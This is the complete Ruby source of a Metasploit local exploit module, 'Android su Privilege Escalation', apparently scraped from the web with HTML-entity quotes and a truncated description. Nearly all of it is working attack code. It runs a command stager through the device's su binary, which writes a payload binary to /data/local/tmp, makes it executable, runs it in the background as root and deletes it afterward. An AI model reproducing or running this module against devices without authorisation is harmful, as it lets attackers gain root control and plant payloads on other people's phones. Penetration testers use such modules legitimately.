# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ManualRanking

  include Msf::Exploit::CmdStager
  include Msf::Post::File
  include Msf::Post::Android::Priv

  def initialize(info={})
    super( update_info( info, {
      &#039;Name&#039;           => "Android &#039;su&#039; Privilege Escalation",
      &#039;Description&#039;    => %q{
          a payload as root.

          A rooted Android device will contain a su binary (often linked with
          an application) that allows the user to run commands as root.
          This module will use the su binary to execute a command stager
          as root. The command stager will write a payload binary to a
          temporary directory, make it executable, execute it in the background,
          and finally delete the executable.

          On most devices the su binary will pop-up a prompt on the device
          asking the user for permission.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;DisclosureDate&#039; => &#039;Aug 31 2017&#039;,
      &#039;Platform&#039;       => [ &#039;android&#039;, &#039;linux&#039; ],
      &#039;Arch&#039;           => [ ARCH_AARCH64, ARCH_ARMLE, ARCH_X86, ARCH_X64, ARCH_MIPSLE ],
      &#039;Targets&#039;        => [
        [&#039;aarch64&#039;,{&#039;Arch&#039; => ARCH_AARCH64}],
        [&#039;armle&#039;,  {&#039;Arch&#039; => ARCH_ARMLE}],
        [&#039;x86&#039;,    {&#039;Arch&#039; => ARCH_X86}],
        [&#039;x64&#039;,    {&#039;Arch&#039; => ARCH_X64}],
        [&#039;mipsle&#039;, {&#039;Arch&#039; => ARCH_MIPSLE}]
      ],
      &#039;DefaultOptions&#039; => {
        &#039;WfsDelay&#039; => 5,
      },
      &#039;DefaultTarget&#039;  => 0,
      }
    ))
    register_options([
      OptString.new(&#039;SU_BINARY&#039;, [true, &#039;The su binary to execute to obtain root&#039;, &#039;su&#039;]),
      OptString.new(&#039;WritableDir&#039;, [true, &#039;Writable directory&#039;, &#039;/data/local/tmp/&#039;]),
    ])
  end

  def base_dir
    datastore[&#039;WritableDir&#039;].to_s
  end

  def su_bin
    datastore[&#039;SU_BINARY&#039;].to_s
  end

  def exploit
    if is_root?
      fail_with Failure::BadConfig, &#039;Session already has root privileges&#039;
    end

    linemax = 4088 - su_bin.size
    execute_cmdstager({
      flavor: :echo,
      enc_format: :octal,
      temp: base_dir,
      linemax: linemax,
      background: true,
    })
  end

  def execute_command(cmd, opts)
    su_cmd = "#{su_bin} -c &#039;#{cmd}&#039;"
    cmd_exec(su_cmd)
  end

end

